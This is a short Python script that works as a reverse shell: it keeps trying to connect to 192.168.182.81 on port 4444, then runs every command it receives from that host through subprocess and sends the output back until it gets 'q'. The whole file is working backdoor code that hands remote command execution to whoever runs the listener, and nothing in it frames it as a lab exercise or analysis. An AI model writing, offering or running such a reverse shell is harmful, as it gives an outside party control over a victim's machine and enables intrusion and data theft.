
import subprocess
import socket

s=socket.socket()
while True:
    try:
        s.connect(("192.168.182.81",4444)) #client ip
        break
    except ConnectionRefusedError:
     pass
     print("connect")

while True:

    cmd=s.recv((1024)).decode()
    if cmd=="q":
         break
    output=subprocess.getoutput(cmd)
    
    
    s.send(output.encode())

    
s.close
    
    
